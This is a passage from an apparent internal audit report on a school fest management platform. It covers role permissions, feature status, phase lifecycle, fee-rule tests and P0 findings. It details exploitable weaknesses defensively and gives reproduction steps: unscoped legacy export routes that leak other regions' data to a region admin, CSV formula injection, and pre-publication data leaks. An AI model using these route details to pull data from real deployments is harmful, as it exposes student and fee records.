| `event_admin` (FestEventStaff-scoped) | Sahodaya Admin | Per its own code comment: "a full sahodaya-admin experience, but locked to the specific events they've been assigned" | **`NAV-SEC-01`** (P1 — every non-event-scoped read page — individual student PII, the full user roster, finance pages — is fully readable regardless of event scope; only write actions are gated), **`API-01`** (P1 — the API event-list endpoint ignores the scope entirely and returns every event in the tenant) |
| `region_admin` (FestEventStaff-scoped, one region on a partitioned hub) | Sahodaya Admin | Same as event_admin, further scoped to one region | **`SEC-01[Lifecycle]`/`RECON-04`** (P0/P1, merged — legacy `FestExportController` routes leak every region's registrations/results/attendance/fee data), **`Event-ops EVT-01`** (P1 — can approve/reject another region's clash requests via the hub URL, and by the identical unfixed pattern likely disqualify/reinstate and falsify attendance for that region too; only `/reports/*` has the containment fix), `SCHREG-05` (P3 — can verify documents for a school outside their assigned region), plus `NAV-SEC-01`/`API-01` above |
| `fest_ops` (auto-granted on any single operational duty on any single event) | Fest Ops Portal | Gate scanning, attendance marking, stage/kitchen ops — intended to be scoped to the assigning event | **`Event-ops EVT-02`** (P1 — gate-check scan and attendance-mark have no per-event check at all; a staffer assigned `duty=food` on Event Y can falsify attendance and view participant PII on unrelated Event X) |
| `mark_entry_coordinator` / `mark_entry_admin` | Mark Coordinator Portal | Enter marks for assigned events | Subject to Marks `EVT-01/02/03/04`; the underlying save services rely on caller discipline for lifecycle gating rather than self-enforcing it (`DATA-03`, design_gap — no live bug today, but a future call site could silently skip the gate) |
| `discipline` duty (FestEventStaff) | intended: dedicated ops surface | Documented in the UI as "Discipline / item head admin" | `NAV-03`/`Event-ops EVT-05` (merged, P3 — the dedicated `fest.discipline` middleware is fully implemented but attached to zero routes) |
| School Admin (`school_admin`) | School Admin | Register/withdraw/edit rosters, bulk-assign, CSV import, view reports, request substitutions/clash reviews | **`SCHREG-01`** (P0 — bulk/CSV silently drops all but the last student on a shared solo item), **`SCHREG-02`** (P0 — `registration_locked` is never checked on roster edits), `SCHREG-03` (P1), **`UI-School EVT-01`** (P1 — substitution requests missing the partition-scope guard clash requests already have) |
| `school_event_coordinator` (program-scoped) | School Admin | Same as School Admin, restricted to one program | `UI-School EVT-02` (P2 — Sports Meet's bare hub URL 403s for a correctly-scoped coordinator) |
| Judge (Judge Dashboard) | Portal | Enter marks/scores for assigned items | Marks `EVT-02` (P1 — a judge's entered subtotal has no upper bound anywhere in the stack) |
| Student / Teacher / Group self-service | Portal | View/manage own registrations, standby swaps | Not separately audited beyond what School registration and Marks sections already cover |
| Public / anonymous visitor | Public site (server-rendered, no auth) | Search participants, view schedule/results/scoreboard once published, verify certificates by QR | **`PUB-01`** (P1 — leaks scheduled time/stage before `schedule_published`), **`SEC-02[Lifecycle]`** (P1 — athletic-records/live pages leak names+marks pre-publication, gated only on a feature toggle), **`SEC-05[Lifecycle]`/`PHASE-03`** (P1, merged — one published phase exposes every phase's marks), `PUB-03`/`SEC-02[SecAudit]` (P2 — unfiltered roster dump / no rate limiting), `PUB-02` (P2 — phased public schedule renders empty for most of its useful window), **`CERT-03`** (P1, likely — public certificate verify/print never resolves the correct per-Sahodaya database) |

**Confirmed working, redundantly enforced — the positive counterpart, so this matrix isn't read as "everything is broken":** cross-Sahodaya, cross-school, and state-level access boundaries are all independently confirmed correctly enforced at the middleware layer (`POS-01`, Audit 3, re-confirming `TEN-01`/`DATA-06`/`NAV-SEC-02` from Audit 1 and `TIF-02`–`TIF-05` from Audit 2). Narrow-permission staff are blocked from registration approve/reject identically on web and API (`API-02`). The gap this matrix documents is specifically **region-scoped and event-scoped actors reading or writing outside their assigned slice within a tenant they do legitimately belong to** — not cross-tenant leakage, which is solid everywhere sampled.

---

## 5. Feature coverage matrix

Ten feature areas. Status reflects the worst confirmed defect reachable through ordinary use in that area; "Broken" is reserved for areas containing at least one P0.

| # | Feature area | Status | Key evidence |
|---|---|---|---|
| 1 | **Event setup** (create/edit/publish/cancel/delete) | **Broken** | `EVT-01[Event setup]`/`FEE-01[Financial]` (P0, merged): cancelling any event 500s. `EVT-02` (P2): deletion orphans `fest_item_heads`/`fest_competition_areas`. `EVT-03` (P2): no chronological date validation. `EVT-06` (P2, design_gap): reopening never restores force-withdrawn registrations. *Positive:* `EVT-04`/`EVT-05` confirm status-transition guard and phase-lifecycle write paths both work. |
| 2 | **Competition setup** (items, taxonomy, eligibility, competition types) | **Partially working** | `CS-01` (P1): pair/trio items don't enforce roster size or count toward group caps. `CS-02` (P1): "prior qualification required" rule is a permanent no-op, can defeat a sibling OR-rule. `CS-03` (P1): eligibility rules stop applying once routed to a partition child. `CS-04`/`CS-05` (P2): taxonomy reset hard-deletes in-use entries; mandatory-item check only runs on manual review. *Positive:* `CS-06`/`CS-07` confirm custom types and tenant/scope checks work. |
| 3 | **School registration** (create, bulk, import, edit, substitution, withdrawal) | **Broken** | `SCHREG-01`/`SCHREG-02` (P0 each): bulk/CSV roster loss; registration lock not enforced on edit. `SCHREG-03` (P1): substitution approval skips eligibility. `SCHREG-04` (P2): bulk-reject reason optional. *Positive:* `SCHREG-08` confirms resubmission after rejection works end to end. |
| 4 | **Event operations** (attendance, gate, clash, appeals, schedule, staff) | **Partially working** | `Event-ops EVT-01`–`EVT-04` (P1 each): cross-region clash/attendance writes; unrelated-event attendance falsification; empty Appeals queue on hubs; undetected teacher double-booking. `TECH-03[TechAudit]` (P1): waitlist promotion has no capacity lock, proven live. `TECH-01[TechAudit]` (P1): no schema-level chest-number/item-registration uniqueness, proven live. *Positive:* `EVT-06`[ops] confirms chest/registration numbering is race-safe. |
| 5 | **Marks and results** (entry, judge panels, grading, publish, championship) | **Partially working** | Marks `EVT-01` (P1): results publish with zero marks by default. `EVT-02` (P1): judge subtotals unbounded. `EVT-04` (P1): a single disqualification can permanently block publish under the strict flag. `EVT-03`/`EVT-05` (P2): marks editable post-item-publish; championship board doesn't auto-recalculate. *Positive:* `EVT-06`/`EVT-07`[marks] confirm grade-banding and tie-break/lock logic. |
| 6 | **Qualification and promotion** (multi-level advancement) | **Partially working** | `QUAL-01` (P1): manual State nomination never verified against a real mark. `QUAL-02`/`QUAL-03` (P2): re-promotion to a corrected target silently no-ops; resubmission duplicates unchanged entries. `QUAL-04` (P2, design_gap): the reserve-replacement workflow both error messages promise doesn't exist. *Positive:* `QUAL-06` confirms partitioned-hub promotion correctly aggregates. |
| 7 | **Certificates and closure** (issuance, collection, verification, lockdown) | **Partially working** | `CERT-01` (P1): certificate collection ignores `entity_type`. `CERT-02`/`SEC-04[Lifecycle]` (P1, merged): disqualification/unpublish never revokes stale certificates/qualifications. `CERT-03` (P1, likely): public verify/print doesn't resolve per-Sahodaya DB. *Positive:* `CERT-05` confirms post-completion lockdown works. |
| 8 | **Phase-based conduct** (multi-phase/multi-region hubs) | **Broken** | `PHASE-01` (P0): phase edits are silently inert once synced once. `MCS-01` (P0): registration structurally blocked for non-regional phases. `PHASE-02`/`PHASE-03` (P1): item-window resolution and public/report visibility are not phase-aware. See §6 for the full matrix. |
| 9 | **Fee resolution and financial reconciliation** | **Broken** | `FEE-01/02[Snapshot]` (P0 each): paid fees silently overwritten, invoice status sticky. `FEE-02[Financial]` (P0): batch cancellation doesn't credit. `MLB-01`/`MCS-01` (P0/P1): named-Sahodaya rules the current fee catalog cannot express or reach. `RECON-01`/`RECON-02`/`RECON-04` (P1 each): "Paid" under-reports installments; rollup double-counting; region-scope bypass. See §7 and §13. |
| 10 | **Reports, exports, and public visibility** | **Broken** | `SEC-01[Lifecycle]`/`RECON-04` (P0, merged): region-scope bypass on 4 legacy export routes, proven live. `EXP-01` (P1): Malayalam renders as tofu boxes in every PDF. `SEC-01[SecAudit]`/`EXP-02`/`SEC-01[TestExec]` (P1/P2, one bug class): CSV/Excel formula injection across ~20+ call sites. `SEC-02[Lifecycle]`/`SEC-05[Lifecycle]` (P1 each): pre-publication leaks. *Positive:* `RPT-10`/`RECON-05`/`POS-01` confirm the bulk of the report inventory and its core reconciliation invariant are solid. See §8. |

---

## 6. Phase lifecycle matrix

Whether editing a phase's lifecycle fields (registration window, lock, scoring lock, results/schedule publish, appeals, status) through the documented admin write path actually takes effect on the mechanism schools and judges hit. Source: Audit 2 §1, cross-referenced against Audit 3's independent rediscovery of the same public-visibility and export-ordering gaps.

| Capability | Phase-aware? | Behavior once a phase has synced at least once | Severity | Finding |
|---|---|---|---|---|
| Registration creation gate (`EventLifecycleGate::allowRegistrationForItem`) | Yes — live, wired into `FestRegistrationCreateService::createForSchool()` | Reads a **stale** leaf/child-phase copy if the root phase is edited *after* the first sync; the copy is never refreshed by the normal edit path | **P0** | `PHASE-01` |
| Phase topology auto-resync | Only lazy — fires solely when the leaf event is entirely **missing** | Never re-syncs a leaf that already exists but has gone stale; `assignItems()` is the only controller action that calls `sync()` | **P0** | `PHASE-01` |
| Mark-entry gate (`EventLifecycleGate::allowMarkEntryForItem`) | Yes — live, wired into 6 separate controllers | Inherits the same staleness risk as the registration gate | **P0** (inherits) | `PHASE-01`, `PHASE-04` |
| Item registration-window resolution (`FestItemWindowResolver`) | **No** — never references `FestEventPhase`/`phase_id` anywhere | Falls back through item → head → event → area windows with zero phase awareness; can wrongly block a phase-open item, or wrongly clear a phase-closed one | **P1** | `PHASE-02` |
| Results/report publication (`phase_mode_enabled`, non-regional-billing events) | **No** — whole-event only | Phase-level `results_published` toggle is accepted by the update endpoint but is inert; public visibility and report export both gate on the event-wide flag | **P1** | `PHASE-03` / `SEC-05[Lifecycle]` (merged) |
| Public visibility (names, marks, schedule) | **No** | Gates purely on `$event->results_published`/`schedule_published`; zero item- or phase-level flag anywhere in `FestPublicVisibilityService` | **P1** | `PHASE-03` / `SEC-05[Lifecycle]` (merged) |
| Report export lifecycle gate | Broken sequencing | Event-level `enforceReportLifecyclePhase()` 403s **before** the phase-scoped check is ever reached — the phase-aware check exists in code but is unreachable in the relevant case | **P1**/P2 | `PHASE-03` / `SEC-06[Lifecycle]` (independently rediscovered; kept separate, see §1.3) |
| Results/report publication (regional-billing **leaf** events) | **Yes — correct** | `FestPhasePublicationService` updates leaf + child-phase + root-phase + root together — the working pattern the other paths should copy | — (working) | `PHASE-03` (contrast) |
| Appeal gating (`allowAppealForParticipant`) | Yes — correct phase-aware pattern | — | — | `PHASE-03` (contrast) |
| Attendance entry / bulk import | **No gate of any kind** | Zero `EventLifecycleGate` calls, zero status/phase/results_published checks anywhere; the controller's own docblock documents this as a deliberate choice | **P2** | `PHASE-05` |
| Gate docblock accuracy | N/A | `allowRegistrationForItem()`/`allowMarkEntryForItem()` docblocks still say "Deliberately NOT wired into any existing call site" — both are live on 1 and 6 call sites respectively | **P2** | `PHASE-04` |
| Phase-level cancellation cascade (`quickStatus` → `cancelled`) | **No cascade** | Flips `status` only; no withdrawal, no fee recalculation, no credit — reachable today via a live, authenticated API endpoint even though no UI exposes it | **P1** | `FEE-03[Financial]` |

**Reproduction note (`PHASE-01`):** a throwaway test built a `phased_regional_billing` event, synced topology once, edited the **root** phase's `registration_close` to the past via the exact methods the controller uses, then reloaded fresh. The leaf event, leaf's child phase, and leaf item all still reported the phase as open; `EventLifecycleGate::allowRegistrationForItem()` did not throw. Test file was written, run, and deleted; working tree confirmed clean afterward.

---

## 7. Sahodaya fee-comparison matrix

> **Read this before any figure below.** Every cell is code/test behavior against the fee rule *as stated in each audit's brief for that Sahodaya* — **none of these five rows corresponds to a queryable live tenant.** Kochi Metro, Wayanad, Malabar, Vatakara, and MCS do not exist as database rows anywhere in this repository. The only Sahodaya tenant actually seeded and persisted anywhere is **Malappuram Sahodaya**. Everywhere this section says a number was **"verified,"** it means the fee-resolution **code**, given the stated inputs, was shown to produce the stated outputs — via an existing test re-run, a hand-traced computation cited to file:line, or a throwaway scratch test written/run/deleted. It never means the number was checked against a live, running configuration for that Sahodaya, because no such configuration exists. **A "PASS" in this matrix is not a statement that any of these five Sahodayas was billed correctly in production** — treat it as "the code, given these assumed inputs, computes what the brief says it should," nothing more.

| Dimension | Kochi Metro | Wayanad | Malabar | Vatakara | MCS |
|---|---|---|---|---|---|
| **Tenant status** | Not a live tenant | Not a live tenant | Not a live tenant | Not a live tenant, **and zero source material of any kind exists** | Not a live tenant (has a built-but-unwired data file with a placeholder `tenant_id`) |
| **Fee model matched** | `kalolsavam_composite` | phase-split (`FestEventPhase.school_registration_fee_share`) + per-student | `student_count_slab` **and** flat-per-student, combined | — | batch+phase (`FestRegistrationBatch` + `FestEventPhase`) |
| **School registration fee, as stated** | Tiered by class category: Senior Secondary ₹8,000 / Secondary ₹7,000 / Other ₹7,000 | Phase 1 share ₹30,000 (senior secondary example) / Phase 2 share ₹0 | Stepped by unique student count: 1–49=₹6,000, 50–99=₹8,000, 100–149=₹10,000, 150+=₹12,000 | — | Flat ₹4,000, Level 1 only (Level 2 = ₹0) |
| **Student/participation fee, as stated** | ₹100 incl. 1 item, +₹100/extra item | ₹250/student, both phases | ₹450/student flat, on top of the slab | — | Per-item: Digi ₹100, Off Stage ₹200, Sargadhara ₹300, District ₹400 |
| **Phase/level structure** | None (single-event) | 2 phases | None stated | — | 4 phases across 2 payment levels |
| **Verified via** | `FestSchoolEventFeeServiceTest::test_kalolsavam_composite_tiers_school_fee_by_class_category` (existing, re-run) + 1 fresh scratch test | `FestFeeNoticeScenariosTest::test_wayanad_tiered_registration_across_two_phases` (existing, re-run) + hand-trace at N=100/30 | No matching test exists for the *combined* rule (that's `MLB-01`); slab and flat verified *separately* via existing test + scratch tests | Nothing — no test, no data, no seeder, no doc, no image anywhere in the repo | `FestPhasedRegionalBillingWorkflowTest` (existing, 3/3, re-run) + fresh scratch test |
| **Verification classification** | Traced against code/tests, not a live tenant | Traced against code/tests, not a live tenant | Traced against code/tests, not a live tenant | **Confirmation required — cannot be verified** | Traced against code/tests, not a live tenant |
| **Confirmed bugs affecting this Sahodaya's stated rule** | `KOCHI-02` (group items overbilled by team size), `KOCHI-07` (unconfigured school fee silently defaults to ₹2,000, not ₹0) | `WYN-02` (no 300-student sub-threshold within the Secondary tier exists), `WYN-03` (worked-example's "4th line item" is actually the Phase-1 per-student total, not a 2nd tier) | **`MLB-01`: no `fee_model` can produce the brief's combined number at all** — configuring either mechanism alone under-bills by 21–78%; `MLB-02` (0 students bills the *highest* slab, not ₹0) | N/A — nothing to test | **`MCS-01`: registration is structurally blocked for 2 of the 4 phases** (Digi Fest, District Kalotsav) the moment this workflow mode is used; `MCS-02` (item catalogue/phase map is an unfilled template) |
| **What was found to be correct** | Tiered school-fee-by-class-category arithmetic; quota-exhaustion arithmetic for individual items | Phase-split billing mechanic itself (no double-counting of a student registered in both phases) | Same-student dedup across individual/group/team items (`MLB-04`); slab boundary values 1–49/50–99/100–149/150+ | — | Base fee correctly charged once per school per batch, never duplicated across a level's phases (`MCS-03`) |

**Additional confirmed findings for these Sahodayas that are not bugs, kept for completeness:**

- **`KOCHI-05`** (P3, confirmed) — Fee recalculation on registration cancel/withdraw is correct and atomic. Only gap: missing regression-test coverage asserting `total_due` actually drops.
- **`KOCHI-06`** (P3, confirmed) — Kochi Metro's stated "membership renewal ₹0" is a legitimate, independently-configured value in a wholly separate subsystem (`MembershipFeeCalculator`) with zero code coupling to the event-registration fee — no shared code path to get this wrong.
- **`MLB-05`** (P3, not_a_gap) — Methodology note: the `cksc_tiered` fee tests are **not** the right anchor for Malabar's stated rule (a different tiering axis — by class category, not student count); `student_count_slab` tests are, and that's what `MLB-01`/`MLB-02` correctly relied on.
- **`MCS-05`** (P2, not_a_gap) — Reports correctly filter by payment level (`registration_batch_id`) in addition to phase and region.
- **`MCS-07`** (P3, not_a_gap) — Data-model clarification: "Level" = `FestRegistrationBatch`, "Phase" = `FestEventPhase`; current code implements the newer plan (`docs/MCS_FOUR_PHASE_COMPLETION_PLAN.md`), the older plan doc is stale wherever the two conflict.

**Boundary-test highlights** (full list in §13):

| Scenario | Expected | Computed | Result |
|---|---|---|---|
| Kochi Metro: 3-member group item, per-student rate ₹100 | 1 team-level charge | `student_registration_fee`=₹300 (3× the per-participant rate) | **FAIL** (`KOCHI-02`) |
| Kochi Metro: missing `school_registration_flat`, 3 independent reproductions | ₹0 | ₹2,000 every time | **FAIL** (`KOCHI-07`) |
| Malabar, 49 students: slab alone vs. brief's combined total (₹28,050) | ₹28,050 | ₹6,000 (**−22,050 short**) | **FAIL** (`MLB-01`) |
| Malabar, 49 students: flat alone vs. brief's combined total | ₹28,050 | ₹22,050 (**−6,000 short**) | **FAIL** (`MLB-01`) |
| Malabar slab, `studentCount=0` | ₹0 or lowest tier | ₹12,000 — falls to the **top** slab | **FAIL** (`MLB-02`) |
| MCS: Level 1 + Level 2 rollup | ₹5,000 | 4,300+700=5,000 | **PASS** (`MCS-03`) |
| MCS: registration attempt on a non-regional phase (Digi Fest / District) | Succeeds | `ValidationException`, "Select a region…", for every non-regional phase | **FAIL** (`MCS-01`, P0) |
| Cap/min on phase billing: cap=₹1,000; phase share 2,000 + item override 5,000 | total_due=₹1,000 (capped) | total_due=₹7,000 (**cap ignored entirely**) | **FAIL** (`FEE-03[Precedence]`) |
| Fully-paid+approved `flat_school` fee (₹1,000), schedule edited to ₹1,800, recalculated | Refuse the overwrite, or log an adjustment | `total_due` silently becomes 1,800; `amount_paid` stays 1,000; status flips to `partial`; **0 AuditLog rows** | **FAIL** (`FEE-01[Snapshot]`, P0) |
| Event cancellation (any Fest event, any Sahodaya) | status→cancelled; registration→withdrawn; credit issued | `\Error` thrown mid-transaction, full rollback | **FAIL — total blocker** (`EVT-01[Event setup]`/`FEE-01[Financial]`, P0) |
| MCS-style batch cancellation, ₹4,100 fully paid, registrations withdrawn | credit ≈ ₹4,100 | reduction computed = ₹0 | **FAIL** (`FEE-02[Financial]`, P0) |

---

## 8. Complete report inventory

**Catalog scale (independently re-counted this series):** `FestReportCatalog::exports()` defines **50 unique** export ids and `interactivePages()` defines **22**. `SCHOOL_SAFE_EXPORT_IDS`, the allowlist gating which of those 50 a School Admin may export, covers 21 of them.

| Report / capability | Status | Severity | Finding |
|---|---|---|---|
| Fee-collection, fees, fee-pending-schools, item-counts, mark-entry-status, head-wise, school-detailed, house-detailed, student-wise, item-wise, numbering-register, pending-approvals, attendance (the `REGION_ID_AWARE_IDS` group) on a phase-based hub | **Broken** — silently drops one phase's rows when a region has 2+ phase-children sharing one `region_id` | P2 | `RPT-01` |
| Cross-school export blocking (`SCHOOL_SAFE_EXPORT_IDS` allowlist) | Working today, but untested and has 2 confirmed bypass routes (`groupRoster`, `attendanceSheet`) that skip the allowlist entirely | P2 | `RPT-02` |
| Report-boundary regression suite | 1 pre-existing red test — asserts a 404 the app deliberately no longer returns (302 redirect instead) | P2 | `RPT-03` |
| State-tier consolidated results/points/school-ranking export | **Missing** — `schoolRankings()` is computed but never exposed as a download; only inline Inertia page data | P2 | `RPT-04` |
| Judge/staff assignment list report | Cataloged in the ERP Reports Hub as available; resolves to nothing but the live CRUD screen | P3 | `RPT-05` |
| Distinct-student headcount | **Missing** — the only related report counts registrations, over-counting students entered in multiple items | P3 | `RPT-06` |
| Refunds/adjustments itemized register | **Missing** — only a Sahodaya-wide aggregate credit number exists | P3 | `RPT-07` |
| Accommodation/lodging tracking + report | **Missing entirely** — a feature gap, not merely a reporting gap (food/catering is fully built; lodging doesn't exist anywhere) | P3 | `RPT-08` |
| School-strength-category report | **Missing**; unclear if it maps to a real Kalolsavam requirement distinct from the membership-only band concept | P3 | `RPT-09` (product decision required — §17) |
| School/student registration, participation, rosters, head/discipline/category totals, chest numbers, ID cards, attendance, venue/stage schedule, clash report, mark-entry status, results, rankings, points, promotions, appeals, certificate counts | **Present, wired, tenant/event/school-scoped, real export formats** | — | `RPT-10` (confirmatory — treat as the regression baseline) |

**Export quality, cutting across the whole catalog** (full detail in §11/§15):

| Dimension | Status | Severity | Finding |
|---|---|---|---|
| Malayalam rendering in PDF | **Broken** — 30/30 Fest PDF views use Latin-only fonts; DejaVu Sans has 0/128 Malayalam codepoints | P1 | `EXP-01` |
| CSV/Excel formula injection | **Broken** — no writer neutralizes `=`/`+`/`-`/`@`; reproduced live via 2 independent routes | P1 | `SEC-01[SecAudit]` / `EXP-02` / `SEC-01[TestExec]` (one bug class) |
| UTF-8 BOM on hand-rolled CSV | **Absent** on all ~8 call sites — Malayalam mojibakes on Windows Excel double-click-open | P2 | `EXP-04` |
| Region scoping on legacy export routes | **Broken** — proven live, see §1.4 #1 | **P0** | `SEC-01[Lifecycle]` / `RECON-04` |
| Lifecycle gate on legacy `export.results` | **Absent entirely** | P2 | `SEC-03[Lifecycle]` |
| File format honesty (`.xls` labeling) | Downloads as `.xls`/`application/vnd.ms-excel` but is hand-built SpreadsheetML XML text, not real binary XLS — triggers an Excel security warning | P3 | `EXP-07` |
| Totals-row consistency (PDF vs Excel, same report) | Item Registration Counts: PDF shows totals; Excel doesn't, despite identical filtering | P3 | `EXP-08` |
| Empty-state handling | 20 of 30 report Blade views use plain `@foreach` with no `@empty` — a zero-row report silently renders a blank table | P3 | `EXP-09` |
| Chunking / memory discipline | Zero use of `chunk()`/`cursor()`/`lazy()` anywhere in the ~7,600-line report/export layer | P2 | `EXP-05` / `TECH-08[TechAudit]` |
| Time/memory budget or async fallback | Only 2 of many heavy export methods bump PHP limits; existing `CsvExportDispatcher` queued-job pattern is unused by any Fest report builder | P2 | `EXP-06` |

**Financial reconciliation on top of these reports** — see §13 for the full detail (`RECON-01` through `RECON-06`).

---

## 9. Confirmed P0–P3 findings (full deduplicated catalog)

**Organization:** by severity (P0 → P3), then by theme within each severity. All 216 deduplicated findings appear here. P0 and P1 findings carry the full field template below; P2 findings carry the same fields in a condensed form; P3 findings — the large majority of which are dead-code/cosmetic/documentation/positive-confirmatory items — are presented as dense single-entry cards that still carry every required field, just without repeated labels. A finding's **Status** field uses the source audits' own vocabulary (`confirmed`, `not_a_gap`, `design_gap`, `test_gap`, `likely`, `confirmation_required`) — `not_a_gap` entries are kept in this catalog deliberately, exactly as the source audits kept them, so this document does not misrepresent working code as broken by omission. Two P0/P1 findings are presented once each as **merged** entries (both source IDs in the header) per §1.3; two further pairs are presented as separate, cross-referenced entries per the same section.

Full field template used for P0/P1 (P2/P3 condense the same fields):

> **Finding ID · Title** — Severity · Status · Source audit(s)
> Affected tenant · Affected actors · Event types · Phase/level
> **Expected** / **Actual** / **Reproduction** / **Evidence** / **Files** / **Business impact** / **Security/data impact** / **Recommended fix** / **Regression tests** / **Estimated scope** / **Dependencies**

### 9.1 P0 — 11 findings

#### `SEC-01[Lifecycle]` — Legacy export routes bypass region-scoping entirely
**Severity:** P0 · **Status:** confirmed, empirically proven live · **Source:** Audit 3 §4. **Not merged** — kept as a separate entry from its own internal duplicate `RECON-04` (P1, §9.2) per §1.3: both are independently valuable evidence of the same underlying vulnerability, and this is **the single highest-severity finding in the entire series**. Read the two together when prioritizing; it is one fix, not two.

**Tenant:** any (not tenant-specific) · **Actors:** `region_admin` (FestEventStaff-scoped to one region on a partitioned hub) · **Event types:** any Sahodaya-level event with `conduct_mode=partitioned`, region/finale children · **Phase/level:** fest-day and post-results reporting/export

**Expected.** Per the codebase's own documented Phase-1 exit criterion (`ResolveRegionScopedReportEvent.php:28`, quoted verbatim): *"Region A admin receives no Region B sentinel data from any parent, child, preview, or export URL."*

**Actual.** `FestExportController`'s four methods (`registrations`, `results`, `attendance`, `fees`) each only check same-tenant membership, then call `FestExportService`, whose methods query `whereIn('event_id', $event->reportableEventIds())` — which on a hub expands to every child+grandchild event, i.e. every region. These 4 routes sit inside the same route group as the properly region-scoped `/reports/*` routes but are declared **outside** (before) the `region.report.scope` middleware group that narrows a region-locked admin's hub request down to their own region.

**Reproduction.** Two throwaway PHPUnit tests (both written, run, and deleted; `git status --short` confirmed clean afterward), reusing the project's own `RegionAdminReportContainmentTest` two-region sentinel-fixture pattern. `SEC-01[Lifecycle]`'s test: a region_admin assigned only to Region A, hitting the already-fixed sibling route (`reports.index`) correctly saw only Region A (200, contained); the same actor hitting `export.results`/`export.registrations`/`export.fees`/`export.attendance` all returned 200 **including Region B's sentinel data**. `RECON-04`'s independent test: the same actor over real HTTP through the real middleware stack retrieved School B's (Region B) name and a distinctive `424242` fee-total marker planted specifically on that school, while the canonical scoped path correctly excluded it for the identical actor.

**Evidence.** `FestExportController.php` (38 lines, only an `abort_if` tenant check, no scope of any kind); `FestEvent.php:399-413` (`reportableEventIds()`); `routes/web.php:1260-1263` (the 4 export routes) vs. `:1366` (`region.report.scope` group start) vs. `:1263`/`:1396` (`export.fees` vs. the canonical catalog route); `bootstrap/app.php:65` (`region.report.scope` → `ResolveRegionScopedReportEvent::class`); `EnsureSahodayaAdmin.php:84-95` (only checks tenant-membership, never filters data within an event the actor legitimately has a region-scoped role on).

**Files.** `app/Http/Controllers/SahodayaAdmin/FestExportController.php` (whole file); `routes/web.php:1260-1263,1366,1396`; `app/Models/FestEvent.php:399-413`; `bootstrap/app.php:65`.

**Business impact.** Sahodaya regions are often run by different local coordinators with competitive sensitivities around standings and results — a real reputational/trust exposure the moment a second region-partitioned Sahodaya goes live.

**Security/data impact.** Direct violation of the region-containment guarantee the product explicitly built, tested, and documented for the sibling report routes. These 4 routes are not linked from the current Vue frontend, but the raw URLs are live, guessable (same shape as every other event-scoped route), and reachable today by anyone holding `region_admin` credentials on the hub. This is a same-tenant, cross-region privilege escalation, not a cross-tenant leak.

**Recommended fix.** Delete `FestExportController` and its 4 routes now that the catalog's equivalent export ids are served safely through `FestReportController::export()`; or wrap the 4 routes in the same `region.report.scope` middleware and rewrite `FestExportService`'s methods to accept and honor a `FestReportScope`. Do the same for `SEC-03[Lifecycle]` (zero lifecycle gate on `export.results`) in the same change — see §11. Do **not** remove the sibling `export.attendance` route casually — `Attendance.vue:342` links to it directly, so any fix must re-point that link, not just delete the route.

**Regression tests.** Promote both scratch tests (`ZZScratchVerifySec01Test`, `ZZScratchExportFeesRegionLeakTest`) into the permanent suite, asserting all 4 legacy routes correctly exclude out-of-region sentinel data.

**Estimated scope:** medium (one controller, 4 routes, needs either deletion+relink or a scope-passing rewrite; the sibling `export.attendance` link must be preserved). **Dependencies:** none — can ship independently and immediately.

---

#### `EVT-01[Event setup]` + `FEE-01[Financial]` — Cancelling any Fest event always fails with a 500
**Severity:** P0 · **Status:** confirmed, independently found and reproduced by two separate audits · **Source:** Audit 1 §6.1 and Audit 2 §9c

**Tenant:** any · **Actors:** Sahodaya Admin · **Event types:** all (shared, event-type-agnostic code) · **Phase/level:** event closure (cancel), any status

**Expected.** Setting a Fest event's status to "Cancelled" (via the Overview page's status dropdown + Save, or the one-click quick-status action) should withdraw active registrations, issue fee credits where applicable, notify, and persist `status='cancelled'`.

**Actual.** `FestEventStatusService::transitionToCancelled()` references `\App\Support\Enums\FestPageActivity::OVERVIEW` inside the audit-log call at the end of its `DB::transaction()` closure. The real class is `App\Support\FestPageActivity` — no `Enums` sub-namespace. Every other of the ~35 controllers using `FestPageActivity` imports the correct class; this is the one bad reference. The class-constant access forces class resolution at that statement, fatals with an uncaught `Error`, which `DB::transaction()` catches, rolls back, and rethrows as an HTTP 500 with the event status unchanged. **No Fest event has ever been successfully cancelled through this code path since it was written** — both `update()` and `quickStatus()` call the identical `transitionToCancelled()`, so both write paths share the fatal.

**Reproduction.** As sahodaya_admin, open any FestEvent in draft/published/registration_open/ongoing status. Set status to "Cancelled" and Save. Observe HTTP 500; event status unchanged in the DB. Reproduced twice, independently, by both audits: Audit 1's scratch test (seeded tenant + `published` event, no paid fees) got response 500, `$response->exception` was `Error` with message exactly `Class "App\Support\Enums\FestPageActivity" not found`, `$event->fresh()->status` remained `'published'`. Audit 2's scratch test used a full fixture (registration + approved ₹4,100 receipt): after the crash, registration stayed `approved`, `FestFeeCredit::count()`=0, event stayed `registration_open` — nothing the admin was shown (a warning requiring them to confirm "credit_all") actually happened.

**Files.** `app/Services/Events/FestEventStatusService.php:86`; call sites at `app/Http/Controllers/SahodayaAdmin/FestEventController.php:630` (`update()`) and `:1427` (`quickStatus()`).

**Business impact.** Sahodaya Admins cannot cancel any Fest event through the UI at all, for any reason, on any tenant.

**Security/data impact.** No cancellation, no registration withdrawal, no fee credit issuance, no cancellation notification ever fires — a full functional blocker, not a security issue in isolation, but it blocks the only recovery path for several other findings in this document (`FEE-02[Financial]`, `EVT-06[Event setup]`).

**Recommended fix.** One-line namespace correction at `FestEventStatusService.php:86`: `App\Support\Enums\FestPageActivity` → `App\Support\FestPageActivity`.

**Regression tests.** None exist today (`grep -rln "transitionToCancelled|FestEventStatusService" tests/` and `grep -rln "'cancelled'" tests/Feature/SahodayaAdmin/` both return nothing). Add a test asserting `update()`/`quickStatus()` can transition an event to `'cancelled'` without a 500, that active registrations end up `'withdrawn'`, and extend it to all three status services this class-of-bug touches (`McqExamStatusService`, `TrainingProgramStatusService` have zero cancellation tests either, per Audit 2 §11).

**Estimated scope:** trivial (one line). **Dependencies:** `FEE-02[Financial]` (below) cannot be fixed or even tested until this lands first, since it needs a working cancellation to reach the credit-computation bug underneath it.

---

#### `SCHREG-01` — Bulk-assign and CSV import silently drop every student but the last on a shared solo item
**Severity:** P0 · **Status:** confirmed · **Source:** Audit 1 §6.3

**Tenant:** any · **Actors:** School Admin (`FestEventStudentRegistrationController::bulkAssign()` → `FestBulkRegistrationService`; `FestRegistrationController::importStore()` → `FestRegistrationImportService`) · **Event types:** any event with a solo (non-group) item whose `max_per_school > 1` · **Phase/level:** bulk/batch registration

**Expected.** Bulk-assigning N students, or importing an N-row CSV, to the same solo item (within `max_per_school`) should register all N as participants on that item.

